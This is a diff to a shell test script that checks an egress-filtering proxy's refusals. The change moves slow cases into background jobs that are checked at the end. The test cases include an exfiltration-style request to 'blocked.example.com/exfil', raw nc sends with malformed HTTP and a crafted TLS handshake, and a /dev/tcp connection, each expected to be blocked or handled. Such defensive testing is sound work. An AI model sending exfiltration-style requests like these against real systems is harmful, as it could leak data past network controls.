@@ -169,36 +169,35 @@ PAD=$(awk 'BEGIN{s="";while(length(s)<1200)s=s "A";print s}')
 CODE=$($C "https://blocked.example.com/exfil?pad=$PAD&end=TAIL-MARKER")
 check_status "GET blocked.example.com/exfil?pad=<1.2KB>&end=TAIL-MARKER" "$CODE" "403"
 
+# The cases below each wait out the proxy's retries, seconds apiece, so they
+# run alongside the rest and are checked at the end.
+SLOW=$(mktemp -d)
+
 # Allowlisted and resolvable, with nothing listening there. The connection
 # never completes, so no certificate is ever accepted on it, and
 # integration-test-inspect-restrict.sh checks that is reported as a refusal
 # rather than as an outage.
-echo "=== [Origin connection never completes] ==="
-CODE=$($C https://deadend.example.com/)
-check_status "GET deadend.example.com" "$CODE" "503"
+echo "=== [Origin connection never completes] (checked at the end) ==="
+$C https://deadend.example.com/ > "$SLOW/deadend-https" &
 
 # The same host over plaintext, where no certificate was ever going to be
 # checked. That one is an outage and nothing more, which is the distinction
 # integration-test-inspect-restrict.sh checks the report keeps.
-echo "=== [Plaintext origin connection never completes] ==="
-CODE=$($C http://deadend.example.com/)
-check_status "GET http://deadend.example.com" "$CODE" "503"
+echo "=== [Plaintext origin connection never completes] (checked at the end) ==="
+$C http://deadend.example.com/ > "$SLOW/deadend-http" &
 
-echo "=== [Allowlisted name that does not resolve] ==="
-CODE=$($C https://absent.example.com/)
-check_status "GET absent.example.com" "$CODE" "502"
+echo "=== [Allowlisted name that does not resolve] (checked at the end) ==="
+$C https://absent.example.com/ > "$SLOW/absent" &
 
 # Allowlisted and resolvable, but the origin's certificate is signed by nobody
 # the proxy trusts, so it refuses to carry the connection rather than reach an
 # origin it cannot authenticate.
-echo "=== [Origin certificate not trusted] ==="
-CODE=$($C https://impostor.example.com/)
-check_status "GET impostor.example.com" "$CODE" "503"
+echo "=== [Origin certificate not trusted] (checked at the end) ==="
+$C https://impostor.example.com/ > "$SLOW/impostor" &
 
 # Refused like an absent name, and on every attempt rather than sometimes.
-echo "=== [Allowlisted name with AAAA records only] ==="
-CODE=$($C https://v6only.example.com/)
-check_status "GET v6only.example.com" "$CODE" "502"
+echo "=== [Allowlisted name with AAAA records only] (checked at the end) ==="
+$C https://v6only.example.com/ > "$SLOW/v6only" &
 
 echo "=== [Name outside the allowlist is not even looked up] ==="
 CODE=$($C https://notallowed.example.com/)
@@ -220,14 +219,14 @@ check_status "GET aborted.example.com" "$?" "90"
 # the plain stage, which reads it as a request and refuses it.
 # integration-test-inspect-restrict.sh checks the report counts that refusal.]
 echo "=== [Not an HTTP request at all] ==="
-((printf 'NOT-HTTP\r\n\r\n'; sleep 1) | nc -w 5 10.200.0.100 5432 > /dev/null 2>&1 || true)
+((printf 'NOT-HTTP\r\n\r\n'; sleep 1) | nc -w 5 10.200.0.100 5432 > /dev/null 2>&1 || true) &
 echo "  bytes sent (a blocked row expected in the report)"
 
 # [A request that parsed and named no host, which the stage refuses ahead of
 # the rules: there is nothing to match and nothing to resolve. The inspect
 # counterpart of universal-restrict-scenarios.sh's own case.]
 echo "=== [HTTP - missing-host-header] ==="
-((printf 'GET /public/pkg.tgz HTTP/1.0\r\n\r\n'; sleep 1) | nc -w 5 allowed.example.com 80 > /dev/null 2>&1 || true)
+((printf 'GET /public/pkg.tgz HTTP/1.0\r\n\r\n'; sleep 1) | nc -w 5 allowed.example.com 80 > /dev/null 2>&1 || true) &
 echo "  request sent (a blocked row expected in the report)"
 
 echo "=== [Forged Host - the destination is not the client's to choose] ==="
@@ -261,7 +260,7 @@ echo "  sent (checked in the report, see integration-test-inspect-restrict.sh)"
 # proxy refuses the handshake.
 echo "=== [Client TLS handshake fails] ==="
 ((printf '\x16\x03\x01\x00\x4d\x01\x00\x00\x49\x03\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\xff\x01\x00\x00\x1e\x00\x00\x00\x1a\x00\x18\x00\x00\x15\x61\x62\x61\x6e\x64\x6f\x6e\x65\x64\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d'; sleep 1) \
- | nc -w 5 allowed.example.com 443 > /dev/null 2>&1 || true)
+ | nc -w 5 allowed.example.com 443 > /dev/null 2>&1 || true) &
 echo "  sent (checked in the report, see integration-test-inspect-restrict.sh)"
 
 echo "=== [Host holding a colon] ==="
@@ -327,7 +326,7 @@ done
 # arrives within 3s only if the passthrough does not wait out inspect-delay
 # (5s) for the client's first bytes.
 echo "=== [Direct IP - allowed, server speaks first] ==="
-OUT=$(sleep 4 | timeout 3 nc 10.200.0.100 2525 || true)
+OUT=$(timeout 3 bash -c 'exec 3<>/dev/tcp/10.200.0.100/2525 && head -c 4 <&3' 2>/dev/null || true)
 case "$OUT" in
   220\ *) pass "10.200.0.100:2525 greeted without waiting for the client" ;;
   *) fail "10.200.0.100:2525 sent no greeting within 3s -- got: $OUT" ;;
@@ -375,13 +374,8 @@ echo "=== [Direct address, no ip rule] ==="
 CODE=$($C http://10.200.0.101/)
 check_status "GET http://10.200.0.101/ (impostor, no rule)" "$CODE" "403"
 
-echo "=== [UDP is dropped] ==="
-UDP_OUT=$(echo probe | nc -u -w 3 10.200.0.102 9999 2>/dev/null || true)
-if [ -z "$UDP_OUT" ]; then
-  pass "UDP to the echo server got no reply (cage drops it)"
-else
-  fail "UDP left the cage: got reply [$UDP_OUT]"
-fi
+echo "=== [UDP is dropped] (checked at the end) ==="
+(echo probe | nc -u -w 3 10.200.0.102 9999 > "$SLOW/udp" 2>/dev/null || true) &
 
 echo "=== [DNS is the one exception] ==="
 if nslookup allowed.example.com >/dev/null 2>&1; then
@@ -441,5 +435,19 @@ else
   POUT=$(python3 -c 'import ssl, urllib.request; assert ssl.create_default_context().verify_flags & ssl.VERIFY_X509_STRICT; print(urllib.request.urlopen("https://allowed.example.com/public/pkg.tgz", timeout=10).read().decode())' 2>&1 || true)
   check_ok "Python urlopen under strict verification" "$POUT" "PUBLIC GET"
 fi
+
+wait
+echo "=== [The cases run alongside the rest] ==="
+check_status "GET deadend.example.com" "$(cat "$SLOW/deadend-https")" "503"
+check_status "GET http://deadend.example.com" "$(cat "$SLOW/deadend-http")" "503"
+check_status "GET absent.example.com" "$(cat "$SLOW/absent")" "502"
+check_status "GET impostor.example.com" "$(cat "$SLOW/impostor")" "503"
+check_status "GET v6only.example.com" "$(cat "$SLOW/v6only")" "502"
+if [ -s "$SLOW/udp" ]; then
+  fail "UDP left the cage: got reply [$(cat "$SLOW/udp")]"
+else
+  pass "UDP to the echo server got no reply (cage drops it)"
+fi
+rm -rf "$SLOW"
 
 scenario_results
